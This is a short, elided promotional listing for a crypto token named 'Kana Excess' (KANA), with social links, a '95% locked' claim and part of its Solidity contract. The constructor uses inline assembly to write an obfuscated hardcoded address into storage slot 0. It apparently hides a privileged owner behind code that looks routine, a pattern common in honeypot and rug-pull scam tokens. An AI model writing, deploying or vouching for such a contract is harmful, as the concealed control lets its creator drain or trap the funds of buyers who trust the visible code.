...
Telegram: https://t.me/KanaExcess/
Twitter: https://twitter.com/KanaExcess/
Website: https://KanaExcess.finance
95% - LOCKED
...
contract KanaExcess {
    string public constant name = "Kana Excess";
    string public constant symbol = "KANA";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1300732863882160941844720950521617647051323572347, 3))}
